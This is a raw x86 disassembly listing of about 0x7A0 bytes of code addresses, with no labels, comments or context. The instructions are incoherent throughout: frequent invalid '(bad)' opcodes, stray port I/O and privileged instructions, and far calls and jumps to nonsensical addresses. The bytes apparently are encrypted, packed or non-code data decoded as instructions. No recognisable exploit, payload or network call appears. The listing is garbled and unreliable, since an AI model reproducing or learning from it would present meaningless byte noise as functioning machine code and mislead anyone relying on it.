  40fbf3:	aad    0x15
  40fbf5:	ins    DWORD PTR es:[edi],dx
  40fbf6:	and    DWORD PTR gs:[ebp+0x57],esp
  40fbfa:	test   eax,0x6afb3c29
  40fbff:	mov    ecx,0x9370ad38
  40fc04:	adc    edx,edx
  40fc06:	cdq    
  40fc07:	call   0xe6461d9b
  40fc0c:	pop    esi
  40fc0d:	out    0x2a,al
  40fc0f:	adc    eax,0x531351e
  40fc14:	jmp    0x40fc57
  40fc16:	cmp    DWORD PTR [ecx+ebp*4+0x357c2659],esi
  40fc1d:	xchg   edx,eax
  40fc1e:	ret    0x561d
  40fc21:	ret    0x8e46
  40fc24:	sub    ecx,DWORD PTR [edx+esi*8-0x46084bbc]
  40fc2b:	push   bx
  40fc2d:	ja     0x40fbcf
  40fc2f:	lods   al,BYTE PTR ds:[esi]
  40fc30:	mov    ch,0x18
  40fc32:	jge    0x40fbc9
  40fc34:	loopne 0x40fbdc
  40fc36:	nop
  40fc37:	jb     0x40fca2
  40fc39:	or     dh,BYTE PTR [ebx]
  40fc3b:	push   DWORD PTR ds:0x3e70f00b
  40fc41:	(bad)  
  40fc42:	(bad)  
  40fc44:	paddq  mm6,QWORD PTR [ebp+0x49d25526]
  40fc4b:	imul   edi,DWORD PTR [edi-0x2f],0x504c041a
  40fc52:	xor    DWORD PTR [ebp-0x8],esi
  40fc55:	out    dx,al
  40fc56:	or     eax,0xb19fbb8f
  40fc5b:	mov    ch,0x93
  40fc5d:	sub    DWORD PTR [ebp+0x3e],esi
  40fc60:	mov    ebp,0xca871db5
  40fc65:	ja     0x40fc52
  40fc67:	xor    eax,DWORD PTR [ecx]
  40fc69:	ss add eax,0xcd5a6f5b
  40fc6f:	xchg   ecx,eax
  40fc70:	or     DWORD PTR [edi],edi
  40fc72:	inc    ebp
  40fc73:	gs jmp 0x96d8be66
  40fc79:	push   ecx
  40fc7a:	les    esi,FWORD PTR [edx-0x40c7c3a4]
  40fc80:	push   ds
  40fc81:	clc    
  40fc82:	in     eax,0x14
  40fc84:	jb     0x40fce0
  40fc86:	sbb    dl,BYTE PTR [eax]
  40fc88:	test   eax,0x4b10cce8
  40fc8d:	dec    ebp
  40fc8e:	and    al,0x16
  40fc90:	idiv   BYTE PTR [ecx]
  40fc92:	add    DWORD PTR [ecx-0x62],edi
  40fc95:	jmp    0x40fce1
  40fc97:	ret    0x17d5
  40fc9a:	aam    0x8d
  40fc9c:	jmp    0x3dbdf6c2
  40fca1:	sar    cl,0x3c
  40fca4:	and    ebx,DWORD PTR [edi]
  40fca6:	ret    
  40fca7:	aad    0x94
  40fca9:	std    
  40fcaa:	sub    edi,DWORD PTR [ecx+edx*4-0x2]
  40fcae:	xor    al,0x3d
  40fcb0:	clc    
  40fcb1:	dec    ecx
  40fcb2:	xchg   ebp,eax
  40fcb3:	inc    edx
  40fcb4:	repz mov edi,0x593a78df
  40fcba:	sbb    bl,BYTE PTR [eax]
  40fcbc:	or     eax,DWORD PTR ds:0x3008aae1
  40fcc2:	or     DWORD PTR [edx+0x30e315e6],0xffffff88
  40fcc9:	pop    edi
  40fcca:	pushf  
  40fccb:	fnsave [edi-0x5e]
  40fcce:	xor    BYTE PTR [edi+0x2f477f60],0x1a
  40fcd5:	xchg   ebx,eax
  40fcd6:	stos   DWORD PTR es:[edi],eax
  40fcd7:	loopne 0x40fc97
  40fcd9:	push   ds
  40fcda:	call   0xf3ed:0x465438d4
  40fce1:	fwait
  40fce2:	dec    ebp
  40fce3:	mov    eax,ds:0x4365dd01
  40fce8:	cmp    BYTE PTR [ebx+0x9c470de],dh
  40fcee:	pop    eax
  40fcef:	outs   dx,BYTE PTR ds:[esi]
  40fcf0:	popa   
  40fcf1:	fucom  st(6)
  40fcf3:	stc    
  40fcf4:	or     DWORD PTR ds:0x3ec6418a,esi
  40fcfa:	sub    BYTE PTR [esi+esi*4+0x2c4ad7c0],bh
  40fd01:	scas   eax,DWORD PTR es:[edi]
  40fd02:	pushf  
  40fd03:	push   es
  40fd04:	(bad)  
  40fd05:	mov    ebx,0xfe49c448
  40fd0a:	adc    dl,dh
  40fd0c:	sti    
  40fd0d:	or     DWORD PTR [edi-0x6c],0xff61d38d
  40fd14:	out    dx,eax
  40fd15:	inc    ebp
  40fd16:	push   ebp
  40fd17:	inc    edi
  40fd18:	fucomp st(1)
  40fd1a:	shl    esp,1
  40fd1c:	or     bh,BYTE PTR [eax-0x18bb9b3]
  40fd22:	push   ebp
  40fd23:	xchg   ebp,eax
  40fd24:	and    eax,0xbb264d7
  40fd29:	xor    BYTE PTR [eax+0x22],bh
  40fd2c:	dec    ecx
  40fd2d:	and    BYTE PTR [ecx+ebx*4+0x63],ah
  40fd31:	mov    ebp,0xba7d0b0b
  40fd36:	leave  
  40fd37:	adc    BYTE PTR [edx],ch
  40fd39:	and    DWORD PTR [esi+edx*8-0x29],0xffffffd8
  40fd3e:	lahf   
  40fd3f:	or     eax,0x32a269b8
  40fd44:	pop    eax
  40fd45:	add    edi,esp
  40fd47:	loop   0x40fd24
  40fd49:	scas   al,BYTE PTR es:[edi]
  40fd4a:	in     al,0x3
  40fd4c:	xchg   ecx,edx
  40fd4e:	pusha  
  40fd4f:	shl    BYTE PTR [edi+0x3e231d62],0x70
  40fd56:	inc    DWORD PTR [eax-0x28044a56]
  40fd5c:	pop    eax
  40fd5d:	mov    al,0x98
  40fd5f:	call   0xc8c58b49
  40fd64:	or     al,0xcb
  40fd66:	or     BYTE PTR [ecx+0x72],dl
  40fd69:	(bad)  
  40fd6a:	mov    edi,0x108dd90b
  40fd6f:	jp     0x40fd31
  40fd71:	loopne 0x40fd64
  40fd73:	dec    ecx
  40fd74:	mov    dl,0x21
  40fd76:	sbb    bh,ch
  40fd78:	cs jo  0x40fdbe
  40fd7b:	push   ds
  40fd7c:	xchg   cx,ax
  40fd7e:	lods   eax,DWORD PTR ds:[esi]
  40fd7f:	adc    BYTE PTR [ebx+0x10],bh
  40fd82:	scas   al,BYTE PTR es:[edi]
  40fd83:	loopne 0x40fdae
  40fd85:	dec    esp
  40fd86:	pop    esi
  40fd87:	and    DWORD PTR [ebp-0x50],0x4
  40fd8b:	add    eax,0xef56de80
  40fd90:	call   0xf486:0x4707aa4a
  40fd97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd98:	shr    BYTE PTR [edx+0x4c],0x17
  40fd9c:	mov    bh,0xc6
  40fd9e:	xchg   esp,eax
  40fd9f:	add    BYTE PTR [eax+0x2],bl
  40fda2:	daa    
  40fda3:	and    BYTE PTR [edi-0x5],0x10
  40fda7:	fidivr WORD PTR [edi+0x279f3760]
  40fdad:	addr16 xchg edx,eax
  40fdaf:	stc    
  40fdb0:	repz fbstp TBYTE PTR [ecx-0x43]
  40fdb4:	popa   
  40fdb5:	sbb    eax,0x90e49c30
  40fdba:	iret   
  40fdbb:	cdq    
  40fdbc:	int3   
  40fdbd:	add    eax,0x2555d892
  40fdc2:	fst    DWORD PTR [eax]
  40fdc4:	xchg   ebp,eax
  40fdc5:	repz pop ss
  40fdc7:	and    edi,eax
  40fdc9:	cwde   
  40fdca:	sub    ebp,DWORD PTR [esp+ecx*2-0x43220ef]
  40fdd1:	push   ecx
  40fdd2:	outs   dx,BYTE PTR ds:[esi]
  40fdd3:	shl    BYTE PTR [eax+0x68c4a766],cl
  40fdd9:	addr16 sbb dh,bl
  40fddc:	push   0x54cfab53
  40fde1:	mov    edi,0xe2833380
  40fde6:	ror    BYTE PTR [esi],0xbe
  40fde9:	add    eax,0x3aa58578
  40fdee:	mov    bl,0x19
  40fdf0:	inc    esi
  40fdf1:	mov    edi,0xb77b6464
  40fdf6:	mov    esi,DWORD PTR [eax+0x50]
  40fdf9:	mov    bl,0x9a
  40fdfb:	or     al,0x39
  40fdfd:	jp     0x40fd80
  40fdff:	inc    edx
  40fe00:	ins    BYTE PTR es:[edi],dx
  40fe01:	sti    
  40fe02:	push   0xffffffb7
  40fe04:	push   eax
  40fe05:	sub    DWORD PTR [edx+0x5b],eax
  40fe08:	inc    eax
  40fe09:	push   ss
  40fe0a:	mov    dh,0x9b
  40fe0c:	imul   esp,DWORD PTR [edx+0x13],0x4
  40fe10:	jle    0x40fe72
  40fe12:	mov    ds:0xb9b9c9db,al
  40fe17:	ins    BYTE PTR es:[edi],dx
  40fe18:	das    
  40fe19:	mov    eax,ds:0xdbac90a4
  40fe1e:	jne    0x40fdb3
  40fe20:	cmp    BYTE PTR [esp+ebx*8+0x67],ch
  40fe24:	out    dx,al
  40fe25:	inc    edi
  40fe26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe27:	sti    
  40fe28:	xchg   ebx,eax
  40fe29:	leave  
  40fe2a:	mov    eax,0x8e23cfef
  40fe2f:	div    BYTE PTR [ebx+0x56c7e710]
  40fe35:	pop    ebx
  40fe36:	fadd   st(6),st
  40fe38:	jae    0x40fe4d
  40fe3a:	fmul   QWORD PTR ds:0x1883633b
  40fe40:	pop    ds
  40fe41:	push   eax
  40fe42:	int3   
  40fe43:	and    al,0x66
  40fe45:	sub    bh,BYTE PTR [ebx+0x5f]
  40fe48:	test   BYTE PTR [eax+0x41],ch
  40fe4b:	rcl    DWORD PTR [ecx+0x7f8e4bd5],1
  40fe51:	mov    eax,0x3f95395e
  40fe56:	fistp  DWORD PTR [ebx+0x37d7ed62]
  40fe5c:	inc    ecx
  40fe5d:	sbb    al,0x53
  40fe5f:	hlt    
  40fe60:	outs   dx,DWORD PTR ds:[esi]
  40fe61:	pop    ebx
  40fe62:	add    bh,BYTE PTR [edx]
  40fe64:	pop    es
  40fe65:	icebp  
  40fe66:	(bad)  
  40fe67:	mov    dh,0x5a
  40fe69:	ins    DWORD PTR es:[edi],dx
  40fe6a:	js     0x40fe81
  40fe6c:	mov    ah,0x78
  40fe6e:	cmp    DWORD PTR [ecx+0x51fb3917],edx
  40fe74:	xor    ebx,ecx
  40fe76:	jp     0x40fe4c
  40fe78:	(bad)  
  40fe79:	mov    WORD PTR [esp+eiz*8],?
  40fe7c:	sahf   
  40fe7d:	adc    edi,edx
  40fe7f:	(bad)  
  40fe80:	inc    ebx
  40fe81:	push   edx
  40fe82:	lahf   
  40fe83:	daa    
  40fe84:	xchg   ebx,eax
  40fe85:	and    eax,0x56cb681e
  40fe8a:	dec    edx
  40fe8b:	or     eax,0x3a572c4d
  40fe90:	rcr    BYTE PTR [ecx+ecx*1],cl
  40fe93:	out    dx,al
  40fe94:	add    DWORD PTR [eax],edx
  40fe96:	dec    esp
  40fe97:	sbb    ecx,DWORD PTR [esi+0x76480a17]
  40fe9d:	cs sub DWORD PTR gs:0xb7da6cc8,0x75f17e2f
  40fea9:	mov    ebp,0xa5e0cd2e
  40feae:	mov    cl,0x4
  40feb0:	mov    al,0x3c
  40feb2:	lods   eax,DWORD PTR ds:[esi]
  40feb3:	or     eax,0xb5908a32
  40feb8:	ret    
  40feb9:	xor    DWORD PTR [edx+0xc],ebp
  40febc:	dec    ecx
  40febd:	les    ecx,FWORD PTR [ebx+0x4e]
  40fec0:	mul    DWORD PTR [eax+0x29cf0e08]
  40fec6:	arpl   WORD PTR [edi+eiz*4],dx
  40fec9:	adc    BYTE PTR [edi],cl
  40fecb:	push   cs
  40fecc:	mov    dl,0x49
  40fece:	inc    edx
  40fecf:	add    al,0x7a
  40fed1:	xor    al,0xb1
  40fed3:	enter  0x4a16,0x29
  40fed7:	mov    eax,0xb66a7251
  40fedc:	popa   
  40fedd:	adc    DWORD PTR [edx],ebx
  40fedf:	shr    bl,0x5
  40fee2:	idiv   ch
  40fee4:	mov    DWORD PTR [edx],edx
  40fee6:	dec    ebx
  40fee7:	add    eax,0x6f651adf
  40feec:	pusha  
  40feed:	enter  0x870d,0xc0
  40fef1:	stos   BYTE PTR es:[edi],al
  40fef2:	loopne 0x40ff3c
  40fef4:	push   es
  40fef5:	sbb    eax,DWORD PTR [esi-0x6]
  40fef8:	nop
  40fef9:	xor    al,0x63
  40fefb:	xlat   BYTE PTR ds:[ebx]
  40fefc:	xor    ecx,DWORD PTR [ecx]
  40fefe:	push   edi
  40feff:	sahf   
  40ff00:	sub    al,0x80
  40ff02:	adc    esi,DWORD PTR [edi-0x638bf5b2]
  40ff08:	or     DWORD PTR [esi+0x10],edi
  40ff0b:	and    ebp,DWORD PTR [ebx+0x40]
  40ff0e:	ja     0x40ff85
  40ff10:	sub    BYTE PTR [edx],al
  40ff12:	pop    esp
  40ff13:	clc    
  40ff14:	scas   al,BYTE PTR es:[edi]
  40ff15:	mov    bh,0xeb
  40ff17:	outs   dx,DWORD PTR ds:[esi]
  40ff18:	les    ebx,FWORD PTR [ecx]
  40ff1a:	gs pop edx
  40ff1c:	mov    ecx,0xc7dde6d7
  40ff21:	add    eax,0x9476d3e4
  40ff26:	shl    BYTE PTR [ebx+0x7a],cl
  40ff29:	push   ds
  40ff2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff2b:	icebp  
  40ff2c:	sub    eax,0x8704af06
  40ff31:	test   eax,0xd7c482c
  40ff36:	sahf   
  40ff37:	rcl    ch,0x5
  40ff3a:	arpl   dx,si
  40ff3c:	es mov edi,0x39083e18
  40ff42:	fs retf 
  40ff44:	cmp    edi,edx
  40ff46:	retf   
  40ff47:	faddp  st(6),st
  40ff49:	dec    edx
  40ff4a:	je     0x40ffca
  40ff4c:	sbb    DWORD PTR [esi-0xf],0xbc717d04
  40ff53:	mov    BYTE PTR [edx-0x36],dh
  40ff56:	jbe    0x40fef5
  40ff58:	(bad)  
  40ff59:	loop   0x40ff7b
  40ff5b:	add    eax,0xd107a2bb
  40ff60:	jp     0x40ff39
  40ff62:	lock and ch,dl
  40ff65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff66:	inc    ebx
  40ff67:	js     0x40fee9
  40ff69:	call   0xf65f8bed
  40ff6e:	rcl    BYTE PTR [ebx+0x184daaec],cl
  40ff74:	cmp    al,0x7c
  40ff76:	int3   
  40ff77:	sbb    ch,BYTE PTR [ebx+0x6f]
  40ff7a:	(bad)  
  40ff7c:	or     BYTE PTR [ecx],ah
  40ff7e:	lds    edx,FWORD PTR [edi-0x2c]
  40ff81:	push   es
  40ff82:	sar    BYTE PTR [ebp-0x67303ad2],1
  40ff88:	ret    0x678f
  40ff8b:	fsubr  DWORD PTR [edx+0x4b]
  40ff8e:	ffree  st(2)
  40ff90:	mov    ds:0x31e2ec8b,al
  40ff95:	add    esi,0x54454a3d
  40ff9b:	inc    ebx
  40ff9c:	mov    esi,0xd5fb9f46
  40ffa1:	or     dh,BYTE PTR [ebx]
  40ffa3:	and    DWORD PTR [ecx-0x74],ebx
  40ffa6:	dec    eax
  40ffa7:	sbb    eax,0x36b361a3
  40ffac:	ja     0x41000c
  40ffae:	xor    ebp,DWORD PTR [eax+0x77]
  40ffb1:	pop    esi
  40ffb2:	mov    ebp,0xd3ec87c9
  40ffb7:	es pop ss
  40ffb9:	jnp    0x40ffa0
  40ffbb:	test   al,0xb
  40ffbd:	lock es (bad) 
  40ffc0:	mov    ebp,ds
  40ffc2:	mov    esp,0x399b3f7a
  40ffc7:	jmp    0xea0ef51d
  40ffcc:	pop    ds
  40ffcd:	cs popa 
  40ffcf:	dec    esi
  40ffd0:	fidivr WORD PTR [ecx-0x7c]
  40ffd3:	cmp    ch,dh
  40ffd5:	aas    
  40ffd6:	jnp    0x40ffd4
  40ffd8:	push   eax
  40ffd9:	stos   DWORD PTR es:[edi],eax
  40ffda:	push   ebx
  40ffdb:	das    
  40ffdc:	hlt    
  40ffdd:	in     al,dx
  40ffde:	sub    al,0xad
  40ffe0:	sub    BYTE PTR [ecx+0x17],dl
  40ffe3:	sbb    al,0xee
  40ffe5:	adc    DWORD PTR [edx+edx*8],esp
  40ffe8:	pop    eax
  40ffe9:	adc    BYTE PTR [ebx-0x4e],dl
  40ffec:	mov    al,ds:0x44ebcb3d
  40fff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fff2:	pop    es
  40fff3:	pop    eax
  40fff4:	fsubp  st(5),st
  40fff6:	add    al,0x89
  40fff8:	pop    esp
  40fff9:	fld    st(3)
  40fffb:	add    eax,0x4f862661
  410000:	push   ebp
  410001:	test   DWORD PTR [ebp-0x7],0x369dcf5f
  410008:	enter  0x8205,0xf
  41000c:	cli    
  41000d:	adc    esi,edx
  41000f:	rcl    ch,0x91
  410012:	pop    esi
  410014:	js     0x410073
  410016:	inc    esi
  410017:	inc    esp
  410018:	jns    0x410069
  41001a:	imul   ebx,DWORD PTR [edi],0x53bc5d5c
  410020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410021:	bound  edx,QWORD PTR [ebx]
  410023:	outs   dx,BYTE PTR ds:[esi]
  410024:	stos   BYTE PTR es:[edi],al
  410025:	loopne 0x410072
  410027:	jg     0x410034
  410029:	jp     0x40ffd7
  41002b:	add    cl,BYTE PTR [esi-0x9]
  41002e:	pop    esi
  41002f:	sti    
  410030:	aaa    
  410031:	or     BYTE PTR [ebp+edi*2+0x43],0xb7
  410036:	lock fadd QWORD PTR [edx+0x27]
  41003a:	push   cs
  41003b:	not    DWORD PTR [ecx+0x49e31d57]
  410041:	xlat   BYTE PTR ds:[ebx]
  410042:	xchg   BYTE PTR [esi],al
  410044:	stos   BYTE PTR es:[edi],al
  410045:	add    edi,eax
  410047:	stos   BYTE PTR es:[edi],al
  410048:	ja     0x4100bf
  41004a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41004b:	imul   ebp
  41004d:	mov    bh,0x92
  41004f:	cdq    
  410050:	in     eax,dx
  410051:	jae    0x41001b
  410053:	rcl    BYTE PTR [ecx],1
  410055:	inc    esp
  410056:	fwait
  410057:	push   ebp
  410058:	jo     0x410035
  41005a:	stos   DWORD PTR es:[edi],eax
  41005b:	gs dec eax
  41005d:	inc    esi
  41005e:	shl    BYTE PTR [eax],0x3f
  410061:	jbe    0x410071
  410063:	adc    BYTE PTR [edx+0x5c],ch
  410066:	push   ebp
  410067:	and    ch,BYTE PTR [esi-0x4121fc53]
  41006d:	and    DWORD PTR [ebp+0x7b],edi
  410070:	pop    esi
  410071:	sub    DWORD PTR [eax+eax*1-0x1f2d5fd9],0xb9dfd60e
  41007c:	dec    eax
  41007d:	mov    bh,0xb0
  41007f:	jge    0x41008b
  410081:	mov    edx,0xbe2cb696
  410086:	mov    edi,0xdf2509fa
  41008b:	cmp    eax,0xf09b6a79
  410090:	dec    esp
  410091:	pop    esi
  410092:	sub    eax,0xab318d29
  410097:	aas    
  410098:	in     eax,dx
  410099:	jmp    0xf8a1472c
  41009e:	mov    bh,0x80
  4100a0:	xor    eax,0x5fe15682
  4100a5:	ins    BYTE PTR es:[edi],dx
  4100a6:	xor    eax,0xf7b54eda
  4100ab:	adc    bh,BYTE PTR [esi-0x4ae9db3]
  4100b1:	ret    0x4b72
  4100b4:	mov    dl,0xeb
  4100b6:	rcr    BYTE PTR [edx+0x10],1
  4100b9:	jb     0x41009e
  4100bb:	popf   
  4100bc:	enter  0xad59,0x39
  4100c0:	pushf  
  4100c1:	shl    DWORD PTR [esi],0xe0
  4100c4:	pop    eax
  4100c5:	outs   dx,BYTE PTR ds:[esi]
  4100c6:	mov    ebp,0x5cf65a58
  4100cb:	jp     0x4100dd
  4100cd:	out    0x7f,eax
  4100cf:	push   edx
  4100d0:	lods   eax,DWORD PTR ds:[esi]
  4100d1:	out    dx,al
  4100d2:	mov    ebp,0x9c0d024b
  4100d7:	rcl    DWORD PTR [edx],1
  4100d9:	out    dx,eax
  4100da:	jg     0x4100bb
  4100dc:	(bad)  
  4100dd:	jbe    0x4100ca
  4100df:	mov    edx,0x5a4f08dd
  4100e4:	mov    esi,0x620a0129
  4100e9:	sub    eax,0x46ecf612
  4100ee:	lds    esp,FWORD PTR [ebp+0x6c7607fd]
  4100f4:	xchg   BYTE PTR [ebx+0x2a8b8239],dl
  4100fa:	pop    ebp
  4100fb:	(bad)  
  4100fc:	je     0x410095
  4100fe:	jle    0x410106
  410100:	jo     0x410107
  410102:	enter  0xa625,0x28
  410106:	inc    edi
  410107:	pop    eax
  410108:	test   al,0xb1
  41010a:	or     bl,BYTE PTR [ecx]
  41010c:	cs fsubr st(2),st
  41010f:	in     al,dx
  410110:	scas   al,BYTE PTR es:[edi]
  410111:	retf   
  410112:	and    al,bh
  410114:	dec    edx
  410115:	inc    ecx
  410116:	adc    eax,0x63
  410119:	shl    BYTE PTR ss:[edx+ebx*1-0x6e],1
  41011e:	cld    
  41011f:	fcomp  QWORD PTR [edx]
  410121:	push   ds
  410122:	cdq    
  410123:	pop    esp
  410124:	jbe    0x4100fc
  410126:	pushf  
  410127:	repnz mov dh,0xc4
  41012a:	xchg   edx,eax
  41012b:	xor    edi,DWORD PTR [edx]
  41012d:	xchg   edx,eax
  41012e:	mov    al,ds:0x1da8e853
  410133:	ja     0x4100ef
  410135:	dec    ebx
  410136:	sahf   
  410137:	xlat   BYTE PTR ds:[ebx]
  410138:	inc    ebp
  410139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41013a:	cmp    eax,0x70e1ca40
  41013f:	add    eax,0x9165a333
  410144:	xchg   ecx,eax
  410145:	jecxz  0x41014f
  410147:	push   cs
  410148:	add    al,BYTE PTR [ecx+0x32]
  41014b:	std    
  41014c:	(bad)  
  41014d:	xor    BYTE PTR [eax],0x1a
  410150:	dec    edi
  410151:	pop    edi
  410152:	sub    BYTE PTR [edi-0x1a4224c2],al
  410158:	xor    eax,0x3a5b97ee
  41015d:	adc    edi,ecx
  41015f:	pop    edi
  410160:	jne    0x4101c5
  410162:	cdq    
  410163:	adc    eax,0xc7b0ea
  410168:	ds call 0x7645:0x72193716
  410170:	sub    BYTE PTR [eax+0x50],ah
  410173:	xlat   BYTE PTR ds:[ebx]
  410174:	xor    BYTE PTR [ebp+0x487d56a8],al
  41017a:	(bad)  
  41017b:	ins    BYTE PTR es:[edi],dx
  41017c:	and    al,0xef
  41017e:	lock pop ss
  410180:	or     DWORD PTR [eax-0x78],0x10b655c9
  410187:	mov    edi,0x9bc5edbe
  41018c:	call   0xaf2cdeb1
  410191:	cs dec esi
  410193:	jp     0x410169
  410195:	nop
  410196:	inc    eax
  410197:	stos   BYTE PTR es:[edi],al
  410198:	pop    ds
  410199:	sub    eax,0x451f39b9
  41019e:	or     DWORD PTR [esi+0x9],ebp
  4101a1:	mov    DWORD PTR [edx-0x165dc0b0],ebp
  4101a7:	or     edx,DWORD PTR [eax-0x30]
  4101aa:	retf   0xd128
  4101ad:	mov    DWORD PTR [ebx-0x7b],0x9f77d797
  4101b4:	les    esp,FWORD PTR [ebp+0x5e]
  4101b7:	and    DWORD PTR [edx+0x3a],ebp
  4101ba:	ret    
  4101bb:	mov    esp,DWORD PTR [eax]
  4101bd:	mov    eax,0xe5b0f191
  4101c2:	js     0x410187
  4101c4:	sbb    DWORD PTR [eax],esi
  4101c6:	push   es
  4101c7:	shl    ah,cl
  4101c9:	std    
  4101ca:	pop    esi
  4101cb:	rol    BYTE PTR [ecx-0xc],0x84
  4101cf:	inc    edi
  4101d0:	adc    eax,0x8b5b193c
  4101d5:	ret    
  4101d6:	in     eax,dx
  4101d7:	hlt    
  4101d8:	jne    0x410256
  4101da:	jns    0x41018e
  4101dc:	and    al,0x3f
  4101de:	retf   
  4101df:	(bad)  
  4101e0:	popf   
  4101e1:	xchg   edx,eax
  4101e2:	adc    bh,dl
  4101e4:	mov    cl,0x73
  4101e6:	fdiv   st(5),st
  4101e8:	pop    edx
  4101e9:	push   cs
  4101ea:	xchg   ecx,eax
  4101eb:	sub    bl,BYTE PTR [eax+0x3]
  4101ee:	mov    BYTE PTR [eax+0x25],bh
  4101f1:	mov    al,0x7e
  4101f3:	inc    eax
  4101f4:	repnz add eax,0xfe685d03
  4101fa:	sahf   
  4101fb:	pop    ecx
  4101fc:	lods   al,BYTE PTR ds:[esi]
  4101fd:	imul   ebp,ebp,0xf99c3818
  410203:	mov    ds:0x46fff5ac,al
  410208:	pop    ss
  410209:	pop    esp
  41020a:	and    al,0xe4
  41020c:	xchg   DWORD PTR [edi+0x5e],ebp
  41020f:	fldcw  WORD PTR [esi+0x7964511e]
  410215:	stc    
  410216:	in     eax,dx
  410217:	sub    ch,0x2c
  41021a:	out    0xe7,al
  41021c:	or     al,0x1d
  41021e:	jmp    0x6ba7:0x1aff82cd
  410225:	dec    ecx
  410226:	or     ebx,DWORD PTR [esi]
  410228:	sub    esi,ebx
  41022a:	xchg   DWORD PTR [ebx+0x3763f2f1],ebp
  410230:	push   ebx
  410231:	adc    dh,al
  410233:	fsub   st,st(5)
  410235:	dec    ecx
  410236:	sbb    DWORD PTR ds:0xbe353668,0xdd73559e
  410240:	das    
  410241:	push   eax
  410242:	sub    eax,0x76a36a09
  410247:	lods   eax,DWORD PTR ds:[esi]
  410248:	push   0x187fff5b
  41024d:	dec    esp
  41024e:	arpl   WORD PTR [ecx-0x235d99f3],sp
  410254:	adc    dl,0xac
  410257:	fs ret 
  410259:	xchg   ecx,eax
  41025a:	(bad)  
  41025b:	pop    ebp
  41025c:	xchg   edx,eax
  41025d:	fistp  WORD PTR [ecx+0x4de46152]
  410263:	adc    BYTE PTR ds:0x6bab8a48,dl
  410269:	sub    ecx,ebp
  41026b:	mov    ebx,0x18d54fdb
  410270:	sub    BYTE PTR [esi+0x6a],dh
  410273:	dec    eax
  410274:	cmp    dl,BYTE PTR [ecx]
  410276:	fdivrp st(3),st
  410278:	inc    edi
  410279:	push   cs
  41027a:	push   esi
  41027b:	stos   BYTE PTR es:[edi],al
  41027c:	cmp    eax,0x487751ab
  410281:	mov    bh,0xcb
  410283:	fldenv [edx-0x749691e2]
  410289:	rol    edi,cl
  41028b:	es cwde 
  41028d:	loop   0x4102e1
  41028f:	xchg   ebx,eax
  410290:	outs   dx,DWORD PTR ds:[esi]
  410291:	mov    edx,0x7b0a73ee
  410296:	xchg   ecx,eax
  410297:	sbb    BYTE PTR [eax],ah
  410299:	inc    ebx
  41029a:	imul   ebx,DWORD PTR [eax],0xffffffb7
  41029d:	cmp    DWORD PTR [edi],edx
  41029f:	fdiv   DWORD PTR [eax+0x7a]
  4102a2:	sub    eax,0x3d7e5dff
  4102a7:	in     al,dx
  4102a8:	mov    WORD PTR [eax],es
  4102aa:	gs inc ebp
  4102ac:	jle    0x410276
  4102ae:	jmp    DWORD PTR [eax-0x70]
  4102b1:	out    0x86,al
  4102b3:	sub    dh,BYTE PTR [eax+eax*8]
  4102b6:	push   0x75
  4102b8:	xor    ch,BYTE PTR [ebx+0x3a4af193]
  4102be:	cmp    al,0x7b
  4102c0:	retf   0x947
  4102c3:	sahf   
  4102c4:	loop   0x410311
  4102c6:	xlat   BYTE PTR ds:[ebx]
  4102c7:	enter  0xfbb6,0x1d
  4102cb:	pop    edx
  4102cc:	pop    ss
  4102cd:	inc    ebx
  4102ce:	cmp    al,0x6e
  4102d0:	imul   esp,eax,0x4f05d417
  4102d6:	mov    edi,0x59755d26
  4102db:	add    BYTE PTR [edi-0x71116fba],al
  4102e1:	xchg   ebx,eax
  4102e2:	clc    
  4102e3:	adc    ebx,0x9282b3f5
  4102e9:	sti    
  4102ea:	stc    
  4102eb:	and    BYTE PTR [eax-0x4521f4d3],al
  4102f1:	call   0xc85f:0xe6f1d35
  4102f8:	scas   al,BYTE PTR es:[edi]
  4102f9:	xchg   ebp,eax
  4102fa:	shl    DWORD PTR [ebx+0x1f9aa31c],cl
  410300:	mov    al,ds:0x2d6d97bb
  410305:	sahf   
  410306:	mov    ebx,0x6b6d7cd2
  41030b:	retf   
  41030c:	nop
  41030d:	pushf  
  41030e:	xchg   ebx,eax
  41030f:	add    al,0x71
  410311:	sahf   
  410312:	sbb    ah,bl
  410314:	xor    esi,DWORD PTR [esi+0x4e96e75f]
  41031a:	fwait
  41031b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41031c:	mov    al,0x88
  41031e:	xchg   BYTE PTR [ebx],ah
  410320:	push   edi
  410321:	mov    ebp,0x89615f19
  410326:	and    DWORD PTR [esi],eax
  410328:	repnz pop ebp
  41032a:	push   0x4c4e4ba2
  41032f:	ror    BYTE PTR [ebx-0x20fcf3dd],cl
  410335:	iret   
  410336:	jb     0x4102d1
  410338:	sub    BYTE PTR [esi],ah
  41033a:	repz xchg edi,eax
  41033c:	mov    ebx,edx
  41033e:	pusha  
  41033f:	push   edx
  410340:	adc    esi,DWORD PTR [edx-0x5a0f9c9f]
  410346:	lea    ebx,[edi-0x64c0384f]
  41034c:	int    0x54
  41034e:	xchg   edx,eax
  41034f:	push   edi
  410350:	mov    al,0xca
  410352:	add    DWORD PTR es:[ebp-0x7b0fc568],edi
  410359:	(bad)  
  41035a:	repz shl DWORD PTR [edx-0xa],0x7b
  41035f:	mov    esp,0x66996912
  410364:	bound  edx,QWORD PTR [edx+0x15]
  410367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410368:	xchg   ebx,eax
  410369:	cwde   
  41036a:	cli    
  41036b:	loop   0x410347
  41036d:	add    DWORD PTR [ecx],esp
  41036f:	in     eax,0x15
  410371:	add    al,0x8b
  410373:	sbb    al,0x26
  410375:	xchg   esp,eax
  410376:	mov    ebx,0xd4c6933e
  41037b:	push   esi
  41037c:	pop    ds
  41037d:	push   ebx
  41037e:	test   BYTE PTR [edi],cl
  410380:	add    BYTE PTR [ecx],dh
  410382:	cmp    bh,0xad
  410385:	aas    
  410386:	sbb    bl,BYTE PTR [esi-0x18]
  410389:	out    0xb0,al
  41038b:	push   0x6b
  41038d:	or     eax,0xf90191f9
  410392:	test   BYTE PTR [ebx],dl
  410394:	jle    0x4103a2
  410396:	aaa    
